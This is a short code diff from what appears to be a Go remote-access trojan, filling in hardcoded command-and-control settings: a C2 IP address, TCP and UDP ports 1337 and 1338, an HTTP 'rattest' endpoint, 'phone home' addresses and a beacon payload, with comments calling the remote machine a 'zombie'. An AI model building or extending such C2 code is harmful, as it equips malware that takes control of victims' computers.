@@ -52,10 +52,11 @@ var BEACONPOSTPAYLOAD string = "{'beacon_payload' : {'auth_string' : 'dont be a 
 // COMMAND AND CONTROL ADDRESSES
 // WE ARE LOCAL, ZOMBIE IS REMOTE!
 // these are set by the project manager script
-var ipstr string //= "192.168.0.2"
+// right now during development, they will waffle back and forth...
+var ipstr string = "192.168.0.2"
 var commandIP net.IP = net.ParseIP(ipstr)
-var TCPPORT int //= 1337
-var UDPPORT int //= 1338
+var TCPPORT int = 1337
+var UDPPORT int = 1338
 var Local_tcpaddr_LAN net.TCPAddr = net.TCPAddr{IP: commandIP, Port: TCPPORT}
 var Local_udpaddr_LAN net.UDPAddr = net.UDPAddr{IP: commandIP, Port: UDPPORT}
 var Local_tcpaddr_WAN net.TCPAddr
@@ -65,11 +66,13 @@ var Remote_tcpport string //= ":1337"
 var Remote_tcpaddr string //= "192.168.0.2" + Remote_tcpport
 var Remote_udpport string //= ":1338"
 var Remote_udpaddr string //= Remote_tcpaddr + Remote_udpport
-var Remote_http_addr string
+var Remote_http_addr string = "http://127.0.0.1/rattest/"
 var Remote_ftp_addr string
 var Remote_dns_addr string
-var PHONEHOME_TCP net.TCPAddr
-var PHONEHOME_UDP net.UDPAddr
+
+// just easier to remember, yeah I know, stop complaining
+var PHONEHOME_TCP net.TCPAddr = Local_tcpaddr_LAN
+var PHONEHOME_UDP net.UDPAddr = Local_udpaddr_LAN
 
 //-----NAME-------------TYPE-----
 var Mega_important_encryption_key string
